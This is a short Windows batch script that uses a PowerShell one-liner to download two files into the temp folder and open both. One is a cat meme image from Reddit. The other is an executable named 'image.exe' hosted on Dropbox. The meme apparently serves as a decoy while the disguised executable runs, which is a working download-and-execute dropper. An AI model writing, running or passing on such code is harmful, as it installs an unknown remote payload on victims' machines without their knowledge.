@echo off

set files="https://www.reddit.com/media?url=https%3A%2F%2Fpreview.redd.it%2Fi-keep-seeing-this-angry-cat-meme-does-anyone-know-what-v0-n9p8aheg9jw91.jpg%3Fwidth%3D1080%26crop%3Dsmart%26auto%3Dwebp%26s%3Daf0ff55ee92c8479c148d47e34d285633b98f76b","https://www.dropbox.com/scl/fi/aye26mdzpnsk7k7ozrjw2/image.exe?rlkey=z0xqqilboj5m9xbskio0xio2e&st=tj3b5ej3&dl=0"

powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
